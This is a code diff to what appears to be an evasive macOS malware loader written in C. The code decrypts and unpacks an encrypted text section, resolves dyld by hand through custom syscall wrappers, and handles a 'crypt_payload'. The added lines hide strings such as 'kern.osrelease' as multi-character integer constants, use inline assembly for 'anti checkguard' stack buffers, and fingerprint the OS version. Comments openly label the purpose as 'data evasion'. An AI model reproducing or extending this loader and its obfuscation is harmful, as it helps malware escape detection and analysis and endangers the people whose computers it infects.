@@ -277,6 +277,26 @@ void* resolve_dyld_start(int fd, void *mheader_ptr)
   return ret_address;
 }
 
+//typedef int (*libSystem_initializer_t)(int argc, char **argv, char **env, char **stackguard, void*a5);
+//
+//void runlibsystemB()
+//{
+//  int  fd;
+//  void *addr = NULL;
+//  char *mh_buffer = (char*)mh_mmap(NULL, 0x400, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
+//  char *a = "/usr/lib/libSystem.B.dylib";
+//  fd = mh_open((char*)&a, O_RDONLY);
+//  
+//  if(fd != 0)
+//  {
+//    __mh_read(fd, mh_buffer, 0x400);
+//    addr = resolve_dyld_start(fd, mh_buffer);
+//  }
+//  
+//   libSystem_initializer_t libSystem_init = addr;
+//}
+
+
 /* Load dyld macho and resolve its entrypoint */
 void *open_and_resolve_dyld()
 {
@@ -287,7 +307,7 @@ void *open_and_resolve_dyld()
   int c = 'lyd/';
   int b = 'bil/';
   int a = 'rsu/';
-  fd = mh_open((char*)&a, O_RDONLY);
+  fd = mh_open_v1((char*)&a, O_RDONLY);
   
   if(fd != 0)
   {
@@ -388,6 +408,16 @@ __END_ENC_TEXT_FUNC
 #include "text_sc_enc.h"
 ///////////////////////////////////////////
 
+void ___memcpy(char* dst, char* src, int size)
+{
+  char* _dst = (char*)dst;
+  char* _src = (char*)src;
+  for (int i=0; i<size; i++)
+  {
+    _dst[i]=_src[i];
+  }
+}
+
 /*
  *  entry_point(int argc, const char * argv[], const char *env[])
  *
@@ -402,13 +432,35 @@ __END_ENC_TEXT_FUNC
 
 int entry_point(int argc, const char * argv[], const char *env[])
 {
-  int ret_val=0;  
+  char* osstr;
+  char* osrelease;
+  int ret_val=0;
+  size_t osstrsize = 0x100;
   mh_mmap_t   _mh_mmap      = NULL;
   strlen_t    _strlen       = (void*)0xFF3000;
   in_param**  patch_param   = (void*)0x2000;
   in_param*   patched_param = (void*)0x12000;
   check_integrity_t _check_integrity = (void*)'1de ';
-  crypt_payload_t     _crypt_payload   = (void*)0x34;
+  crypt_payload_t   _crypt_payload   = (void*)0x34;
+  
+  // Anti checkguard: make room for key table on stack
+  __asm __volatile__
+  (
+   "subl  $0x100, %%esp\n"
+   "movl  %%esp , %0\n"
+   : "=r" (osrelease)
+   :
+   : "eax"
+   );
+  
+  __asm __volatile__
+  (
+   "subl  $0x100, %%esp\n"
+   "movl  %%esp , %0\n"
+   : "=r" (osstr)
+   :
+   : "eax"
+   );
   
   // data evasion
   patch_param = &patched_param;
@@ -437,6 +489,23 @@ int entry_point(int argc, const char * argv[], const char *env[])
   enc_unpacker_text_section(enc_begin_block_addr, enc_block_len);
   
   _check_integrity((*patch_param)->hash);
+  
+  for(int i=0; i<0x100; i++)
+    osstr[i]=0;
+  
+  int o1 = 'nrek', o2 = 'rso.', o3 = 'aele', o4 = 'es';
+  
+  ___memcpy(osrelease,   (char*)&o1, 4);
+  ___memcpy(osrelease+4, (char*)&o2, 4);
+  ___memcpy(osrelease+8, (char*)&o3, 4);
+  ___memcpy(osrelease+12,(char*)&o4, 4);
+  
+  int ret = mh_sysctlbyname(osrelease, osstr, &osstrsize, NULL, 0);
+  
+  if (ret == 0)
+  {
+    
+  }
   
   //mh_bsdthread_create(_check_integrity, &(patched_param->hash), 0x80000, 0, 0);
   
